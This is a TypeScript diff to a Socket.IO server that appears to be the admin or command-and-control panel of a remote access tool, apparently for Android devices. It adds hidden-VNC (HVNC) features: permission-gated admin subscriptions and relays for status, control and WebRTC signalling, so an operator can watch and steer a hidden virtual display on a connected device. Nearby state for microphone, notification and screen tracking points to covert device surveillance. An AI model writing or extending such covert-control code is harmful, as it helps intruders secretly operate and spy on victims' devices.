@@ -32,6 +32,11 @@ const REALTIME_COMMANDS = new Set<CmdType>([
   CMD.WEBRTC_OFFER,
   CMD.WEBRTC_ANSWER,
   CMD.WEBRTC_ICE,
+  CMD.HVNC,
+  CMD.HVNC_CTRL,
+  CMD.HVNC_OFFER,
+  CMD.HVNC_ANSWER,
+  CMD.HVNC_ICE,
 ]);
 
 const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
@@ -124,6 +129,21 @@ class SocketService {
         socket.leave(`screen:${payload.id}`);
       }
     });
+    socket.on('hvnc:subscribe', (payload: { id?: string }) => {
+      const user = (socket as any).user;
+      if (!user?.permissions?.includes('device:hvnc')) {
+        socket.emit('hvnc:error', { id: payload?.id || '', error: 'Insufficient HVNC permission' });
+        return;
+      }
+      if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
+        socket.join(`hvnc:${payload.id}`);
+      }
+    });
+    socket.on('hvnc:unsubscribe', (payload: { id?: string }) => {
+      if (typeof payload?.id === 'string' && payload.id.length > 0) {
+        socket.leave(`hvnc:${payload.id}`);
+      }
+    });
     log.info('Admin frontend connected to Socket.IO');
     socket.on('disconnect', () => { log.info('Admin frontend disconnected from Socket.IO'); });
   }
@@ -206,6 +226,7 @@ class SocketService {
     dbHelpers.setClientData(id, 'notification_status', '[]');
     dbHelpers.setClientData(id, 'mic_status', '[]');
     this.io.to(`screen:${id}`).emit('screen:stopped', { id });
+    this.io.to(`hvnc:${id}`).emit('hvnc:stopped', { id });
     this.io.to('admin').emit('client:disconnect', { id });
   }
 
@@ -673,6 +694,69 @@ class SocketService {
           sdpMLineIndex,
         });
       } catch (err: unknown) { log.error(`WebRTC ICE error: ${err instanceof Error ? err.message : String(err)}`); }
+    });
+
+    // HVNC: Hidden Virtual Display status relay
+    socket.on(CMD.HVNC, (data: any) => {
+      try {
+        if (data.type === 'status') {
+          this.io.to(`hvnc:${id}`).emit('hvnc:status', {
+            id,
+            streaming: data.streaming,
+            virtualWidth: data.virtualWidth,
+            virtualHeight: data.virtualHeight,
+            displayId: data.displayId,
+            densityDpi: data.densityDpi,
+            fps: data.fps,
+            transport: data.transport,
+            connectionState: data.connectionState,
+            sessionId: data.sessionId,
+          });
+          broadcastData('hvnc');
+        } else if (data.type === 'error' && data.error) {
+          this.io.to(`hvnc:${id}`).emit('hvnc:error', { id, sessionId: data.sessionId, error: data.error });
+          dbHelpers.addLog('ERROR', 'HVNC', `HVNC error from ${id}: ${data.error}`);
+        }
+      } catch (err: unknown) { log.error(`HVNC handler error: ${err instanceof Error ? err.message : String(err)}`); }
+    });
+
+    // HVNC WebRTC signaling (Device -> Admin)
+    socket.on(CMD.HVNC_ANSWER, (data: any) => {
+      try {
+        const sessionId = readSessionId(data?.sessionId);
+        if (!sessionId || typeof data?.sdp !== 'string' || data.sdp.length === 0 || data.sdp.length > 2_000_000) return;
+        this.io.to(`hvnc:${id}`).emit('hvnc:answer', {
+          id, sessionId, sdp: data.sdp,
+        });
+      } catch (err: unknown) { log.error(`HVNC Answer error: ${err instanceof Error ? err.message : String(err)}`); }
+    });
+
+    socket.on(CMD.HVNC_ICE, (data: any) => {
+      try {
+        const sessionId = readSessionId(data?.sessionId);
+        if (!sessionId || typeof data?.candidate !== 'string' || data.candidate.length === 0 || data.candidate.length > 16_384) return;
+        const sdpMLineIndex = Number.isInteger(data.sdpMLineIndex) && data.sdpMLineIndex >= 0
+          ? data.sdpMLineIndex
+          : 0;
+        this.io.to(`hvnc:${id}`).emit('hvnc:ice', {
+          id,
+          sessionId,
+          candidate: data.candidate,
+          sdpMid: typeof data.sdpMid === 'string' ? data.sdpMid : null,
+          sdpMLineIndex,
+        });
+      } catch (err: unknown) { log.error(`HVNC ICE error: ${err instanceof Error ? err.message : String(err)}`); }
+    });
+
+    socket.on(CMD.HVNC_CTRL, (data: any) => {
+      try {
+        if (data.active !== undefined) {
+          this.io.to(`hvnc:${id}`).emit('hvnc:status', { id, streaming: data.active });
+        }
+        if (data.error) {
+          this.io.to(`hvnc:${id}`).emit('hvnc:error', { id, error: data.error });
+        }
+      } catch (err: unknown) { log.error(`HVNC control handler error: ${err instanceof Error ? err.message : String(err)}`); }
     });
   }
 
